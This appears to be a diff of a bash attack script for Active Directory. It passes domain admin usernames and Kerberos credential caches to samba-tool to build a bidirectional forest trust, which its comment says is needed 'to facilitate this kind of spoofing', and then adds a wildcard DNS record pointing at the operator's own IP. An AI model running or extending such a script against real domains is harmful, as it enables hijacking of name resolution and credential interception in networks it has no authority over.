@@ -1,16 +1,18 @@
 #!/bin/bash
 
 localdom=$1
-localsuffix=$2
-remdom=$3
-remsuffix=$4
-remote=$5
-localccachepath=$6
-remccachepath=$7
-localip=$8
+localdomadmuser=$2
+localsuffix=$3
+remdom=$4
+remdomadmuser=$5
+remsuffix=$6
+remote=$7
+localccachepath=$8
+remccachepath=$9
+localip=${10}
 
 # Create bidirectional trust necessary to facilitate this kind of spoofing
-sudo samba-tool domain trust create $remdom.$remsuffix --type=forest --direction=both -U $remdom.$remsuffix\\Administrator --use-krb5-ccache=$remccachepath --local-dc-username=$localdom.$localsuffix\\Administrator --local-dc-use-krb5-ccache=$localccachepath
+sudo samba-tool domain trust create $remdom.$remsuffix --type=forest --direction=both -U $remdom.$remsuffix\\$remdomadmuser --use-krb5-ccache=$remccachepath --local-dc-username=$localdom.$localsuffix\\$localdomadmuser --local-dc-use-krb5-ccache=$localccachepath
 
 # Create wildcard record pointing at our network-facing local IP
 ./targetresolver.sh $localdom $localsuffix $localccachepath "*" $localip
